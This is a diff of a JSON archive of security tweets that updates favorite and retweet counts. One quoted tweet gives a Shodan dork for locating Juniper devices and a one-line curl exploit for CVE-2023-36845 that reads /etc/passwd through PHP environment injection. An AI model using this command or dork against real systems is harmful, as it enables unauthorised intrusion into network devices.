@@ -25,10 +25,10 @@
     "username": "hosselot"
 }
 {
-    "tweetfavorites": 294,
+    "tweetfavorites": 291,
     "tweetquotes": 0,
     "tweetreplies": 3,
-    "tweetretweets": 112,
+    "tweetretweets": 110,
     "tweettext": "finally Juniper - Remote Code Execution 🔥 ( CVE-2023-36845 )  \nShodan Dork : title:\"Juniper\" http.favicon.hash:2141724739  \n\nPoc: curl &lt;TARGET&gt; -F $'auto_prepend_file=\"/etc/passwd\\n\"' -F 'PHPRC=/dev/fd/0'\n\n#bugbountytips #bugbounty #CVE-2023-36845 #RCE https://t.co/FbXzJzcxHW",
     "tweettime": "2023-09-28, 09:56:02",
     "tweeturl": "https://twitter.com/zapstiko/status/1707333333292838946",
@@ -88,7 +88,7 @@
     "username": "chybeta"
 }
 {
-    "tweetfavorites": 58,
+    "tweetfavorites": 57,
     "tweetquotes": 1,
     "tweetreplies": 0,
     "tweetretweets": 6,
